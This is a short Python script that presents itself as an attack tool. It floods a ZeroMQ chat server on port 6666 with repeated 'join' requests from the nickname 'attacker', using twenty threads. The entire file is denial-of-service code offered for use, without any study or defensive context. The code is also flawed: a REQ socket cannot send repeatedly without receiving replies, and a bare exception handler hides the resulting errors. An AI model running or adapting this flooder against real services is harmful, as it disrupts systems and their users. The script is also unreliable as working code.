import zmq
import time
from threading import Thread

class ChatFlooder:
    def __init__(self, host="localhost", port=6666, threads=10):
        self.target = f"tcp://{host}:{port}"
        self.running = True
        self.threads = threads
        self.sent = 0

    def flood(self):
        ctx = zmq.Context()
        sock = ctx.socket(zmq.REQ)
        sock.connect(self.target)
        while self.running:
            try:
                sock.send_json({"type":"join","nick":"attacker"})
                self.sent += 1
            except: pass

    def run(self):
        print(f"[*] Flooding {self.target} - Ctrl+C to stop")
        for _ in range(self.threads):
            Thread(target=self.flood).start()
        
        try:
            while self.running:
                print(f"\rRequests sent: {self.sent}", end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Stopping attack")

if __name__ == "__main__":
    ChatFlooder(threads=20).run()